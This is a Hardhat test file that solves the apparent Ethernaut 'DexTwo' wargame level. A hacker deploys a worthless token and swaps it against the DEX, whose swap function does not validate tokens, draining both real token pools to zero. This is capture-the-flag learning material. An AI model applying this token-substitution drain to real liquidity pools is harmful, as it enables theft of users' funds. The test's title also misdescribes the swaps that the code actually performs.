import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 23 - DexTwo contract hack", () => {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const DexContract = await ethers.getContractFactory("DexTwo");
        const TokenContract = await ethers.getContractFactory("SwappableToken");

        const dex = await DexContract.deploy();
        const token1 = await TokenContract.deploy(await dex.getAddress(), "Token 1", "TKN1", BigInt(110));
        const token2 = await TokenContract.deploy(await dex.getAddress(), "Token 2", "TKN2", BigInt(110));
        const token3Hacker = await TokenContract.connect(hacker).deploy(await dex.getAddress(), "Token 3", "TKN3", BigInt(1000));

        await dex.connect(owner).setTokens(await token1.getAddress(), await token2.getAddress());
        await dex.connect(owner).approve(await dex.getAddress(), BigInt(100));
                
        await dex.connect(owner).add_liquidity(await token1.getAddress(), BigInt(100));
        await dex.connect(owner).add_liquidity(await token2.getAddress(), BigInt(100));

        await token1.connect(owner).transfer(hacker.address, BigInt(10));
        await token2.connect(owner).transfer(hacker.address, BigInt(10));

        return {owner, hacker, dex, token1, token2, token3Hacker};
    };
    
    describe("When hacking", () => {
        it("Hacker should deplete the DEX by iteratively swapping from token1 to itself (same with token 2) back and forth", async() => {
            /*
             * Provided that the swap method has now no checks on the tokens that are traded,
             * the hacker is able to deploy his own token -which we call token3- and use it as if it were a traded token.
             * That way, he can deplete the DEX from its both valid tokens balances.
            **/
            const {owner, hacker, dex, token1, token2, token3Hacker} = await loadFixture(setUp);
            
            expect(await token1.balanceOf(await dex.getAddress())).to.equal(BigInt(100));
            expect(await token2.balanceOf(await dex.getAddress())).to.equal(BigInt(100));

            await dex.connect(hacker).approve(await dex.getAddress(), BigInt(1000));
            await token3Hacker.connect(hacker)["approve(address,uint256)"](await dex.getAddress(), BigInt(1000));

            // Initially, the hacker transfers 100 units of token3 to the dex in exchange for 100 token1 units.
            // Then, the hacker transfers 200 units of token3 in exchange for 100 token2 units.
            // As a result, both balances are depleted from the dex.
            await token3Hacker.connect(hacker).transfer(await dex.getAddress(), BigInt(100));
            await dex.connect(hacker).swap(await token3Hacker.getAddress(), await token1.getAddress(), BigInt(100));
            await dex.connect(hacker).swap(await token3Hacker.getAddress(), await token2.getAddress(), BigInt(200));

            expect(await token1.balanceOf(await dex.getAddress())).to.equal(BigInt(0));
            expect(await token2.balanceOf(await dex.getAddress())).to.equal(BigInt(0));
        });
    });
});